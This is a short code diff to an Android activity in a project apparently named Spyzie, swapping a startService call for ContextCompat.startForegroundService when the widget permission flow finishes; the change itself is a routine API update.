@@ -11,6 +11,7 @@ import android.view.View;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import com.tantd.spyzie.R;
 import com.tantd.spyzie.SpyzieApplication;
@@ -99,7 +100,7 @@ public class PermissionActivity extends BaseActivity {
             result.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, appWidgetId);
             setResult(RESULT_OK, result);
             Intent serviceIntent = new Intent(SpyzieApplication.getInstance(), MainService.class);
-            SpyzieApplication.getInstance().startService(serviceIntent);
+            ContextCompat.startForegroundService(SpyzieApplication.getInstance(), serviceIntent);
             finish();
         }
     }
